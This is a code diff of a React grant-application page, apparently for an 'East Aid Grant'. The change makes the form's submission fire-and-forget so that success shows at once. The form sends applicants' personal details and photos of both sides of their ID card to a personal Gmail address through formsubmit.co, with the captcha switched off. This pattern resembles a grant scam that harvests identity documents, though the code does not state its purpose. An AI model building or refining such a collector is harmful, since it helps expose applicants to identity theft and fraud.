@@ -158,15 +158,12 @@ export default function Apply() {
       localStorage.setItem('eastaidgrant_applications', JSON.stringify(existing));
     } catch { /* ignore */ }
 
-    // Send via FormData multipart to direct endpoint so image files arrive as real attachments
-    try {
-      const fd = new FormData();
-      // FormSubmit config fields
+    // Send via FormData multipart — fire and forget so success shows instantly
+    const fd = new FormData();
       fd.append('_subject',       `🏛️ New Grant Application: ${grantTitle} (Ref: EAG-${ref})`);
       fd.append('_captcha',       'false');
       fd.append('_template',      'table');
       fd.append('_next',          `${window.location.origin}/`);
-      // Application fields
       fd.append('Reference ID',               `EAG-${ref}`);
       fd.append('Grant Applied For',          grantTitle);
       fd.append('Award Range',                awardText);
@@ -181,15 +178,11 @@ export default function Apply() {
       fd.append('Project Title',              form.projectTitle);
       fd.append('Project Proposal Summary',   form.projectDescription || 'N/A');
       fd.append('Submission Time',            new Date().toLocaleString());
-      // Attach compressed ID card images as real file attachments
       if (compressedFront) fd.append('ID Card Front', compressedFront, `ID-Front-${form.fullName.replace(/\s+/g,'-')}-${compressedFront.name}`);
       if (compressedBack)  fd.append('ID Card Back',  compressedBack,  `ID-Back-${form.fullName.replace(/\s+/g,'-')}-${compressedBack.name}`);
 
-      await fetch('https://formsubmit.co/erimiposi2005@gmail.com', {
-        method: 'POST',
-        body: fd,
-      });
-    } catch { /* silent fallback */ }
+    // Do NOT await — email delivers in the background, user sees success immediately
+    fetch('https://formsubmit.co/erimiposi2005@gmail.com', { method: 'POST', body: fd }).catch(() => {});
 
     setStatus('success');
   };
